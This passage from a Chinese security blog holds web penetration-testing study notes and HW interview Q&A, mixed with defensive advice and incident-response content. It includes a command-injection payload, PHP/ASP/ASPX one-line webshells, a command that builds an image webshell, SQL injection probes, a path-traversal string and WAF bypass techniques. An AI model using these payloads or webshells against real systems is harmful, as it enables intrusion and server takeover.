href="#修复建议：" class="headerlink" title="修复建议："></a>修复建议：</h5><p>升级到PHP7.1</p><p>php.ini中关闭“allow_url_fopen”。在它打开的情况下，可以通过pher://等协议丢给include，让其执行动态代码。</p><p>永远不要在代码中使用eval。</p><p>严格进行过滤。</p><h4 id="命令执行漏洞以及利用"><a href="#命令执行漏洞以及利用" class="headerlink" title="命令执行漏洞以及利用"></a>命令执行漏洞以及利用</h4><h5 id="相关函数："><a href="#相关函数：" class="headerlink" title="相关函数："></a><a href="https://www.secpulse.com/archives/115318.html" target="_blank" rel="noopener">相关函数</a>：</h5><p>实例：</p><pre><code>&lt;?php$a=$_GET[&#39;ip&#39;];if($a){    system(&quot;ping -c 1 $a&quot;);}?&gt;</code></pre><p>payload：<a href="http://127.0.0.1/testphp/eval.php?ip=127.0.0.1|whoami" target="_blank" rel="noopener">http://127.0.0.1/testphp/eval.php?ip=127.0.0.1|whoami</a></p><p>其中的利用管道符号来实现在shell中的多重命令执行</p><h5 id="命令执行绕过："><a href="#命令执行绕过：" class="headerlink" title="命令执行绕过："></a><a href="http://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener">命令执行绕过：</a></h5><p>windows：</p><p>用^来转义&lt;&gt;</p><p>linux：</p><p>用\来转义&lt;&gt;</p><h4 id="dvwa靶场实战："><a href="#dvwa靶场实战：" class="headerlink" title="dvwa靶场实战："></a>dvwa靶场实战：</h4><p>impossible级别源码：</p><pre><code>&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    $target = stripslashes( $target );    // Split the IP into 4 octects    $octet = explode( &quot;.&quot;, $target );    // Check IF each octet is an integer    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) {        // If all 4 octets are int&#39;s put the IP back together.        $target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3];        // Determine OS and execute the ping command.        if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {            // Windows            $cmd = shell_exec( &#39;ping  &#39; . $target );        }        else {            // *nix            $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );        }        // Feedback for the end user        echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;    }    else {        // Ops. Let the user name theres a mistake        echo &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;;    }}// Generate Anti-CSRF tokengenerateSessionToken();?&gt; </code></pre><ul><li><h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3></li></ul><p>这是根据代码审计出来的，只能盲猜</p><p>魔术方法都是用__开头的：</p><p>__construct：构造函数，当对象创建（new）时会自动调用，unserialize反序列化时是不会被自动调用的</p><p>__destruct：析构函数，当对象被销毁时会自动调用。</p><p>__wakeup：</p><p>unserialize()时会检查是否存在__wakeup()，如果纯在，则会悠闲调用。</p><p>__sleep():用于提交未提交的数据，或蕾西的清理操作，因此当一个对象被序列化的时候被调用 </p><ul><li><h3 id="XXE外部实体注入"><a href="#XXE外部实体注入" class="headerlink" title="XXE外部实体注入"></a>XXE外部实体注入</h3><h4 id="熟悉XML定义："><a href="#熟悉XML定义：" class="headerlink" title="熟悉XML定义："></a>熟悉XML定义：</h4></li></ul><p><a href="https://blog.csdn.net/github_36086968/article/details/93044993" target="_blank" rel="noopener">XML定义，语法，解析学习</a></p><h4 id="理解DTD的作用："><a href="#理解DTD的作用：" class="headerlink" title="理解DTD的作用："></a>理解DTD的作用：</h4><h4 id="理解XXE原理："><a href="#理解XXE原理：" class="headerlink" title="理解XXE原理："></a>理解XXE原理：</h4><h4 id="掌握XXE利用方式："><a href="#掌握XXE利用方式：" class="headerlink" title="掌握XXE利用方式："></a>掌握XXE利用方式：</h4><ul><li><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3></li></ul><h4 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a><a href="https://blog.csdn.net/weixin_45116657/article/details/100602769" target="_blank" rel="noopener">漏洞产生原因</a></h4><h4 id="包含函数介绍："><a href="#包含函数介绍：" class="headerlink" title="包含函数介绍："></a>包含函数介绍：</h4><h5 id="include"><a href="#include" class="headerlink" title="include():"></a>include():</h5><p>当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</p><h5 id="include-once"><a href="#include-once" class="headerlink" title="include_once():"></a>include_once():</h5><p>功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次。</p><h5 id="require"><a href="#require" class="headerlink" title="require():"></a>require():</h5><p>require()与include()的区别在于require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。<br>使用require()函数包含文件时，只要程序一执行，立即调用文件，而include()只有程序执行到该函数时才调用。</p><h5 id="require-once"><a href="#require-once" class="headerlink" title="require_once():"></a>require_once():</h5><p>它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p><h5 id="利用copy合成一个一句话图片马-bat："><a href="#利用copy合成一个一句话图片马-bat：" class="headerlink" title="利用copy合成一个一句话图片马.bat："></a>利用copy合成一个一句话图片马.bat：</h5><p>copy 1.jpg/b + help.php/a help.jpg</p><ul><li><h3 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h3></li></ul><h4 id="业务接口调用"><a href="#业务接口调用" class="headerlink" title="业务接口调用"></a><a href="https://blog.csdn.net/fageweiketang/article/details/81668329" target="_blank" rel="noopener">业务接口调用</a></h4><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><h4 id="越权漏洞：垂直、平行越权"><a href="#越权漏洞：垂直、平行越权" class="headerlink" title="越权漏洞：垂直、平行越权"></a>越权漏洞：垂直、平行越权</h4><h4 id="身份认证安全：session会话固定攻击、cookie仿冒"><a href="#身份认证安全：session会话固定攻击、cookie仿冒" class="headerlink" title="身份认证安全：session会话固定攻击、cookie仿冒"></a>身份认证安全：session会话固定攻击、cookie仿冒</h4><h4 id="密码找回安全"><a href="#密码找回安全" class="headerlink" title="密码找回安全"></a>密码找回安全</h4><h4 id="pikachu实战演练越权："><a href="#pikachu实战演练越权：" class="headerlink" title="pikachu实战演练越权："></a>pikachu实战演练越权：</h4><p>通过抓取lucy的个人信息，将其改为lili，既可以实现<strong>水平越权</strong></p><p>通过管理员的增加用户功能的URL，在登陆到pikaichu用户的情况下进行访问，就可以实现垂直越权</p><ul><li><h3 id="cors和jsonp跨域"><a href="#cors和jsonp跨域" class="headerlink" title="cors和jsonp跨域"></a>cors和jsonp跨域</h3></li></ul><h4 id="同源策略介绍："><a href="#同源策略介绍：" class="headerlink" title="同源策略介绍："></a><a href="https://blog.csdn.net/qq_36028303/article/details/80477193" target="_blank" rel="noopener">同源策略介绍</a>：</h4><p>相同的协议、相同的域名、相同的端口</p><ul><li><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a><a href="https://segmentfault.com/a/1190000016026991" target="_blank" rel="noopener">解析漏洞</a></h3></li></ul><p><a href="https://blog.csdn.net/weixin_43625577/article/details/91971796" target="_blank" rel="noopener">常见的解析漏洞总结</a></p><ul><li><h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3></li></ul><h4 id="IIS-PUT-漏洞："><a href="#IIS-PUT-漏洞：" class="headerlink" title="IIS PUT 漏洞："></a>IIS PUT 漏洞：</h4><p><a href="https://blog.csdn.net/XZ_______/article/details/111417967?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161759244516780264012132%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161759244516780264012132&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-4-111417967.first_rank_v2_pc_rank_v29&utm_term=IIS%2BPUT%2B%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">复现IIS PUT任意上传漏洞(过程，步骤，说明)</a>老漏洞了</p><h4 id="心脏滴血漏洞"><a href="#心脏滴血漏洞" class="headerlink" title="心脏滴血漏洞"></a><a href="https://blog.csdn.net/lixue20141529/article/details/77815979" target="_blank" rel="noopener">心脏滴血漏洞</a></h4><h4 id="任意文件读取与下载"><a href="#任意文件读取与下载" class="headerlink" title="任意文件读取与下载"></a><a href="https://blog.csdn.net/weixin_34281477/article/details/92134033" target="_blank" rel="noopener">任意文件读取与下载</a></h4><ul><li><h3 id="授权访问"><a href="#授权访问" class="headerlink" title="授权访问"></a>授权访问</h3></li></ul><h4 id="1-未授权访问漏洞介绍"><a href="#1-未授权访问漏洞介绍" class="headerlink" title="1.未授权访问漏洞介绍"></a>1.未授权访问漏洞介绍</h4><p><a href="https://blog.csdn.net/weixin_45439698/article/details/97672717?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161760573516780269840135%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161760573516780269840135&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-97672717.first_rank_v2_pc_rank_v29&utm_term=%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE" target="_blank" rel="noopener">未授权访问漏洞总结</a></p><h4 id="2-web端未授权访问："><a href="#2-web端未授权访问：" class="headerlink" title="2.web端未授权访问："></a>2.web端未授权访问：</h4><p>案例一：返回包改状态码与删除重定向字段（在面对一闪而过的重定向的页面时）</p><p>步骤一：URL输入 /admin/main.php抓包</p><p>步骤二：状态码302改为200，删除重定向location字段</p><p>目的：直接访问后台文件系统会判断是否登录，未登录会跳转到登录页面，所以我们要删除跳转内容，留在后台界面，进行操作。</p><p>或者找到跳转标签将其删除掉：&lt;meta(案例二)</p><p>步骤三：然后我们就可以在后台增删改查内容</p><p>案例三：js拦截 </p><p>针对弹窗拦截就是js拦截，删除跳转js标签</p><p><a href="https://blog.csdn.net/qq_41679358/article/details/108227070?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161760599716780255257025%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161760599716780255257025&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-108227070.first_rank_v2_pc_rank_v29&utm_term=%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%A1%88%E4%BE%8B" target="_blank" rel="noopener">Redis未授权访问漏洞原理及复现</a></p><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/107822500?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161761058516780269877015%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161761058516780269877015&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-107822500.first_rank_v2_pc_rank_v29&utm_term=rsync%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0" target="_blank" rel="noopener">rsync未授权访问漏洞原理及复现</a></p><ul><li><h3 id="文件上传-amp-编辑器"><a href="#文件上传-amp-编辑器" class="headerlink" title="文件上传&amp;编辑器"></a>文件上传&amp;编辑器</h3></li></ul><p>webshell是一种网站后门木马，也是一种网页版的命令解释器，通过HTTP(s)协议通信，并且继承了web用户的权限</p><h4 id="一句话木马："><a href="#一句话木马：" class="headerlink" title="一句话木马："></a><a href="https://blog.csdn.net/weixin_39190897/article/details/86772765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161761382616780274188830%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161761382616780274188830&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-86772765.first_rank_v2_pc_rank_v29&utm_term=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC" target="_blank" rel="noopener">一句话木马：</a></h4><pre><code>php的一句话木马： &lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</code></pre><p>php一句话木马中的@是为了不报错</p><p>dvwahigh等级的配合组合拳：结合文件包含漏洞来触发上传的图片的马</p><p>针对于前端的绕过可以直接删掉js代码</p><ul><li><h3 id="APP测试"><a href="#APP测试" class="headerlink" title="APP测试"></a>APP测试</h3></li><li><h3 id="AWVS、Nessus"><a href="#AWVS、Nessus" class="headerlink" title="AWVS、Nessus"></a>AWVS、Nessus</h3></li><li><h3 id="MSF和永恒之蓝"><a href="#MSF和永恒之蓝" class="headerlink" title="MSF和永恒之蓝"></a>MSF和永恒之蓝</h3></li><li><h3 id="常见CMS漏洞复现"><a href="#常见CMS漏洞复现" class="headerlink" title="常见CMS漏洞复现"></a>常见CMS漏洞复现</h3></li><li><h3 id="框架和中间件漏洞"><a href="#框架和中间件漏洞" class="headerlink" title="框架和中间件漏洞"></a>框架和中间件漏洞</h3></li></ul><h2 id="3-后渗透篇"><a href="#3-后渗透篇" class="headerlink" title="3.后渗透篇"></a>3.后渗透篇</h2><ul><li><h3 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h3></li><li><h3 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h3></li><li><h3 id="流量映射端口反弹"><a href="#流量映射端口反弹" class="headerlink" title="流量映射端口反弹"></a>流量映射端口反弹</h3></li><li><h3 id="Windows权限维持"><a href="#Windows权限维持" class="headerlink" title="Windows权限维持"></a>Windows权限维持</h3></li><li><h3 id="Linux权限维持"><a href="#Linux权限维持" class="headerlink" title="Linux权限维持"></a>Linux权限维持</h3></li><li><h3 id="渗透的本质"><a href="#渗透的本质" class="headerlink" title="渗透的本质"></a>渗透的本质</h3></li><li><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4></li><li><h3 id="反弹shell方法汇总"><a href="#反弹shell方法汇总" class="headerlink" title="反弹shell方法汇总"></a>反弹shell方法汇总</h3></li><li><h3 id="Windows权限分析"><a href="#Windows权限分析" class="headerlink" title="Windows权限分析"></a>Windows权限分析</h3></li><li><h3 id="Windows-bypassUAC"><a href="#Windows-bypassUAC" class="headerlink" title="Windows bypassUAC"></a>Windows bypassUAC</h3></li><li><h3 id="Windows本地侦查"><a href="#Windows本地侦查" class="headerlink" title="Windows本地侦查"></a>Windows本地侦查</h3></li><li><h3 id="Windows内核提权"><a href="#Windows内核提权" class="headerlink" title="Windows内核提权"></a>Windows内核提权</h3></li><li><h3 id="Windows提权-1"><a href="#Windows提权-1" class="headerlink" title="Windows提权"></a>Windows提权</h3></li><li><h3 id="Linux提权-1"><a href="#Linux提权-1" class="headerlink" title="Linux提权"></a>Linux提权</h3></li><li><h3 id="Metasploit基本使用"><a href="#Metasploit基本使用" class="headerlink" title="Metasploit基本使用"></a>Metasploit基本使用</h3></li><li><h3 id="Metasploit-linux以及windows木马控制"><a href="#Metasploit-linux以及windows木马控制" class="headerlink" title="Metasploit linux以及windows木马控制"></a>Metasploit linux以及windows木马控制</h3></li><li><h3 id="linux权限维持"><a href="#linux权限维持" class="headerlink" title="linux权限维持"></a>linux权限维持</h3></li><li><h3 id="Windows权限维持-1"><a href="#Windows权限维持-1" class="headerlink" title="Windows权限维持"></a>Windows权限维持</h3></li></ul><h2 id="4-Python"><a href="#4-Python" class="headerlink" title="4.Python"></a>4.Python</h2><ul><li><h3 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h3></li><li><h3 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h3></li><li><h3 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h3></li><li><h3 id="第四天"><a href="#第四天" class="headerlink" title="第四天"></a>第四天</h3></li><li><h3 id="第五天爬虫"><a href="#第五天爬虫" class="headerlink" title="第五天爬虫"></a>第五天爬虫</h3></li><li><h3 id="python编写phpstudy-poc"><a href="#python编写phpstudy-poc" class="headerlink" title="python编写phpstudy_poc"></a>python编写phpstudy_poc</h3></li><li><h3 id="渗透测试流程and报告编写"><a href="#渗透测试流程and报告编写" class="headerlink" title="渗透测试流程and报告编写"></a>渗透测试流程and报告编写</h3></li></ul><h2 id="5-SRC漏洞挖掘"><a href="#5-SRC漏洞挖掘" class="headerlink" title="5.SRC漏洞挖掘"></a>5.SRC漏洞挖掘</h2><ul><li><h3 id="SRC信息收集通关之路"><a href="#SRC信息收集通关之路" class="headerlink" title="SRC信息收集通关之路"></a>SRC信息收集通关之路</h3></li><li><h3 id="SRC业务漏洞分类挖掘"><a href="#SRC业务漏洞分类挖掘" class="headerlink" title="SRC业务漏洞分类挖掘"></a>SRC业务漏洞分类挖掘</h3></li></ul><h2 id="6-串讲"><a href="#6-串讲" class="headerlink" title="6.串讲"></a>6.串讲</h2><h3 id="2021-3-30："><a href="#2021-3-30：" class="headerlink" title="2021-3-30："></a>2021-3-30：</h3><h4 id="应急响应："><a href="#应急响应：" class="headerlink" title="应急响应："></a>应急响应：</h4><p><strong><a href="https://www.freebuf.com/column/178677.html" target="_blank" rel="noopener">【应急响应】windows入侵排查思路</a></strong></p><p><a href="https://blog.csdn.net/weixin_44840696/article/details/90142992?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161708352316780357270687%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161708352316780357270687&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~top_positive~default-1-90142992.nonecase&utm_term=%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94" target="_blank" rel="noopener"><strong>应急响应流程</strong></a></p><p><a href="https://github.com/Bypass007" target="_blank" rel="noopener">https://github.com/Bypass007</a></p><p><strong>sql注入原理：</strong>SQL注入是指Web应用程序对用户输入数据的合法性未进行判断、处理，前端传入的参数是攻击者可控的，并且参数被正常的带入到数据库查询，就导致了sql注入漏洞的出现</p><p><strong>xss原理</strong>：是WEB应用程序混淆了用户提交的数据和JS脚本的代码边界，导致浏览器把用户的输入当成了JS代码来执行。xss的攻击对象是浏览器一端的普通用户。</p><p><a href="https://www.freebuf.com/vuls/251028.html" target="_blank" rel="noopener"><strong>SQL注入WAF绕过</strong></a></p><h4 id="hfish蜜罐搭建："><a href="#hfish蜜罐搭建：" class="headerlink" title="hfish蜜罐搭建："></a>hfish蜜罐搭建：</h4><p><a href="https://github.com/secoba/HFish" target="_blank" rel="noopener">企业安全测试主动攻击型蜜罐钓鱼框架系统</a></p><p><a href="https://github.com/hacklcx/hfish/releases同上" target="_blank" rel="noopener">https://github.com/hacklcx/hfish/releases同上</a></p><h1 id="7-2021年HW面试遇到的问题"><a href="#7-2021年HW面试遇到的问题" class="headerlink" title="7.2021年HW面试遇到的问题"></a>7.2021年HW面试遇到的问题</h1><h2 id="3-27面试题目："><a href="#3-27面试题目：" class="headerlink" title="3.27面试题目："></a>3.27面试题目：</h2><p><strong>针对时间盲注你会采用什么函数：</strong>sleep函数 substr函数</p><p><strong>针对文件上传漏洞的过滤你会采取什么措施：</strong></p><p>前端：使用.jsp、.asp、.phtml等绕过</p><p><a href="https://blog.csdn.net/qq_39101049/article/details/89109456" target="_blank" rel="noopener">后端：</a></p><p><strong>SQL注入的原理：</strong>SQL注入是指Web应用程序对用户输入数据的合法性未进行判断、处理，前端传入的参数是攻击者可控的，并且参数被正常的带入到数据库查询，就导致了sql注入漏洞的出现</p><p><strong>SQL注入的分类：</strong>布尔盲注、报错型注入、字符型注入、数字型注入等。</p><p><strong>Xss漏洞的原理：</strong>未对用户输出的数据进行过滤检测或者过滤不完全 就输出到了 前端代码中 导致js代码执行 造成xss漏洞</p><p><strong>如果遇到攻击你会怎么做：</strong>先分析流量，在查看日志看一下攻击的IP地址，最后封禁该IP地址</p><h2 id="3-31面试题目："><a href="#3-31面试题目：" class="headerlink" title="3.31面试题目："></a>3.31面试题目：</h2><p><strong>SQL注入时间盲注的函数：</strong>length（）返回字符串长度、ascii（）返回一个字符串的ascii码、mid（）取出字符串一部分值、substr（）截取字符串、hex（）返回16进制数、sleep（）时间注入核心函数、if（）判断函数</p><p><strong>应急响应：常见的应急响应事件分为：</strong></p><p>Web入侵：网页挂马、主页篡改、webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS攻击、DNS劫持、ARP欺骗</p><p><strong>Linux文件溯源：</strong>远控：拿沙盒分析webshell，看看日志有哪些ip对这个文件进行了访问。Web：分析恶意文件提取IP</p><p><strong>SQL注入字符型和数字型的区别：</strong>字符型注入语句需要使用闭合语句，而数字型注入的语句不需要闭合</p><p><strong>107和11端口的服务：</strong>107远程隐蔽的控制访问服务、11系统状态监控</p><p><strong>SQL注入绕过WAF：</strong>大小写绕过、替换关键字、空格绕过、内联注释、比较符绕过、宽字节绕过</p><p><strong>Xss绕过WAF：</strong>借助黑名单绕过、数字字符编码绕过、大小写绕过、标签双写、空字节绕过、Unicode分隔符</p><p><strong>如何通过流量分析判断攻击类型：</strong>通过流量分析发送的payload，分析payload的构造进行判断。当发现payload中存在SQL语句则该攻击类型为SQL注入。当payload中发现前端代码则该攻击为xss攻击。当payload中发现文件名进行特殊修改或者尝试绕过过滤例如：phP等则该攻击方式为文件上传攻击。</p><p><strong>如何通过流量分析判断是否为使用sqlmap进行的攻击：</strong>1、使用sqlmap进行攻击会产生大量数据2、payload中会存在SQL语句</p><p><strong>常见的端口对应的服务：</strong>11系统状态监控、21FTP文件传输、22SSH、23Telnet远程登录、25SMTP邮件传输、53DNS服务器端口、69TFTP文件传输、80http、107远程登录终端109&amp;110POP3邮件接收、443Https、1433MSSQL数据库、1521ORACLE数据库、3306MySQL数据库、3389远程连接桌面、8080Tomcat，这里是<a href="https://wenku.baidu.com/view/f3cfa0b4da38376bae1fae2d.html" target="_blank" rel="noopener">端口大全</a></p><p><strong>针对文件上传漏洞的过滤你会采取什么措施：</strong>前端：使用burp抓包修改文件后缀或者禁用js。后端：修改http Header content-type为允许字段、00截断绕过上传、文件名大小写绕过、名单列表绕过、特殊文件名绕过、htaccess文件绕过、写入方法绕过</p><h2 id="4-1面试题目："><a href="#4-1面试题目：" class="headerlink" title="4.1面试题目："></a>4.1面试题目：</h2><p><strong>常见的java漏洞：</strong>代码注入、命令注入、连接字符串注入、任意文件下载、任意文件上传、任意目录遍历</p><p><strong>常见的脚本语言：</strong>JavaScript、php、VBScript、python等</p><p><strong>SQL注入分为几类：</strong>布尔盲注、Union注入、报错注入、宽字节注入、时间注入、万能密码、过滤绕过</p><p><strong>常见的web漏洞：</strong>文件上传漏洞、SQL注入漏洞、xss漏洞、文件包含漏洞、弱口令、命令执行漏洞等</p><p><strong>常见的安全设备：</strong>WAF防火墙、IDS入侵检测系统、IPS入侵预防系统、VPN等</p><p><strong>目录遍历的攻击特征：</strong>通过URL传过来的参数，进行URL解码后对其进行分析，其中大部分情况是以../../../etc/passwd作为第一次的要进行目录穿越时构造的payload</p><h2 id="通过以前参加HW的大佬得到的面试题："><a href="#通过以前参加HW的大佬得到的面试题：" class="headerlink" title="通过以前参加HW的大佬得到的面试题："></a><strong>通过以前参加HW的大佬得到的面试题：</strong></h2><p><strong>1、讲述一下搜索框注入的方法：</strong>这里的语法跟普通注入是一样的，搜索框文本注入闭合是有区别的，搜索1’如果报错可能存在漏洞，那么就尝试闭合+注释，1’and 1=1 and ‘1’=’1。如果1=2报错那么这里就确定存在注入了，接下来构造语句即可。</p><p><strong>2、逻辑漏洞的类型：</strong></p><p>支付漏洞：如果系统没有做好价格，数量，支付状态检测，那么就可能存在了支付漏洞，通过修改对应的传参，例如商品的金额，以低价购买高价的物品。</p><p>手机验证码绕过，任意密码重置：此漏洞也是由于系统没有做好检测，只是前端进行了校验，那么通过burp改包就可以绕过。例如在修改密码的地方，放包，抓取响应的状态，修改数值，例如0改为1，false改为true，在放包，就可以达到欺骗客户端的操作。这样的话，找寻大量的手机号，通过抓包改包导致了任意密码重置。</p><p>邮箱验证码可伪造：例如在找会密码的地方，会让用户输入邮箱，然后给你发送一段链接，通过去邮箱查看链接，可以发现中间的一些值是加密的，可通过解密来发现，这个值是你的邮箱，或者一串随机值，那么就可以尝试构造这串值，在另一个用户的地方找回密码。</p><p><strong>3、反射型XSS和DOM型XSS的区别：</strong>dom型xss是通过修改或读取docunment的属性和方法进行攻击，既有反射型也有存储型，而且没有与服务器进行交互。</p><p><strong>4、Linux上传了webshell如何查杀：</strong>首先top查看进程，是否有cpu占用率特别高的以及ID是随机数的，可以尝试kill进程，再次查看还会不会出现。然后可以用ps -ef|gred查看进程详细信息，用/proc找到进程，cp+sz下载文件放入微步在线云沙箱进行分析。确认是木马就删除文件。再cat/etc/rc排查开机启动项和cat/etc/crontab排查定时任务，last,lastlog等排查日志和可以可疑用户。</p><p><strong>5、在一个大流量的环境中，如何快速对报警进行一个判断：</strong>如果是大量相同源ip发起的请求，首先判断是不是一个误报。如果是内部问题导致的误报可以请求甲方进行整改，如果甲方拒绝整改就把这个拉入白名单。同样如果是大量相同的源ip对同一个ip或者网段有大量报警，可以考虑是扫描器或者爆破，比如查看参数，己方是java搭建的网站，却出现了php的语句，可以判断是扫描器在扫描。</p><h1 id="长亭面试题："><a href="#长亭面试题：" class="headerlink" title="长亭面试题："></a>长亭面试题：</h1><p>1<strong>、sleep函数被禁用后，如何进行时间盲注：</strong></p><p>BENCHMARK，Get_lock函数，当都被禁用后可以用计算量比较大的语句使数据库查询时间变长，从而达到延时注入的效果。 mysql：AND (SELECT count(<em>) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);<br><em>*2、CSRF怎么防护：</em></em></p><p>尽量使用POST，限制GET、浏览器cookie策略、加验证码等<br><strong>3、如果一台服务器被入侵后，你会如何做应急响应：</strong></p><p>准备相关工具、查后门等工具、初步判断事件类型，时间等级、抑制范围，隔离使受害面不继续扩大、查找原因，封堵攻击源、业务恢复正常水平、总结，报告，并修复，监控<br><strong>4、如何判断SQL注入，有哪些方法：</strong></p><p>提交错误语句是否有异常，除此之外这些显示的错误可以通过sleep,修眠语句执行5秒等，除此之外通过DNSlog判断是还有传回值<br><strong>5、宽字节注入原理：</strong></p><p>在mysql中使用了gbk编码，占用2个字节,而mysql的一种特性,GBK是多字节编码，它认为两个字节就代表一个汉字，所以%df时候会和转义符\ %5c进行结合,所以单引号就逃逸了出来,当第一个字节的ascii码大于128，就可以了。</p><p><strong>6、Webshell检测有哪些方法：</strong></p><p>grep、关键词、关键函数、安全狗、D盾</p><p><strong>7、SSRF漏洞成因防御绕过：</strong></p><p>模拟服务器对其它资源进行请求 IP探测，如果想漏洞利用必需要构造好Payload 禁止跳转，限制协议，内外网限制，URL限制 针对IP格式</p><p><strong>8、XSS攻击原理：</strong></p><p>反射型xss在浏览器上运行一遍就会造成的攻击，运行一次，不会长时间留存、存储型xss多见于评论处，恶意xss代码写进服务器中，每一次运行都会造成危害，长时间留存</p><p><strong>9、SQL注入防护方法：</strong></p><p>使用安全的API、对输入的特殊字符进行Escape转义处理、使用白名单来规范化输入验证方法、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤转义替换删除</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python与php</title>
      <link href="/2021/02/10/python-yu-php/"/>
      <url>/2021/02/10/python-yu-php/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=386844&auto=1&height=66"></iframe><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><h2 id="python中rb是什么意思-python中rb含义理解"><a href="#python中rb是什么意思-python中rb含义理解" class="headerlink" title="python中rb是什么意思_python中rb含义理解"></a>python中rb是什么意思_python中rb含义理解</h2><p>Python文件读写的几种模式：</p><p>r,rb,w,wb 那么在读写文件时，有无b标识的的主要区别在哪里呢？</p><p>文件使用方式标识</p><p>‘r’:默认值，表示从文件读取数据</p><p>‘w’:表示要向文件写入数据，并截断以前的内容</p><p>‘a’:表示要向文件写入数据，添加到当前内容尾部</p><p>‘r+’:表示对文件进行可读写操作(删除以前的所有数据)</p><p>‘r+a’：表示对文件可进行读写操作(添加到当前文件尾部)</p><p>‘b’:表示要读写二进制数据。</p><p>详细信息↓：</p><p><a href="https://blog.csdn.net/weixin_42116847/article/details/112924747" target="_blank" rel="noopener">python中rb是什么意思_python中rb含义理解</a></p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="1-foreach用法："><a href="#1-foreach用法：" class="headerlink" title="1.foreach用法："></a>1.foreach用法：</h2><pre><code>$x = 